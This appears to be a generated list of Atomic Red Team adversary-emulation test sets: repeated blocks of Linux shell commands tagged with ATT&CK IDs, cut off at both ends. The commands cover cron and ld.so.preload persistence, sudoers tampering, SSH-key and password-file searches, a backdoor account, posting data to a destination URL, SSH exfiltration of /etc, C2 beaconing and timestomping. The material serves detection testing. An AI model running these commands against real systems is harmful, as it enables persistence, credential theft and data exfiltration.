sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1215 ,T1153 ,T1040 ,T1033 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1168 ,T1154 ,T1139 ,T1018 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1168 ,T1154 ,T1145 ,T1033 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1136 ,T1064 ,T1145 ,T1082 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1158 ,T1154 ,T1081 ,T1069 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1136 ,T1064 ,T1145 ,T1082 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1168 ,T1064 ,T1145 ,T1057 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1215 ,T1154 ,T1139 ,T1018 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1136 ,T1064 ,T1081 ,T1201 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1215 ,T1154 ,T1081 ,T1057 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1215 ,T1154 ,T1081 ,T1057 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1168 ,T1064 ,T1145 ,T1018 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1215 ,T1064 ,T1081 ,T1069 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1168 ,T1064 ,T1145 ,T1201 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1136 ,T1064 ,T1139 ,T1057 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
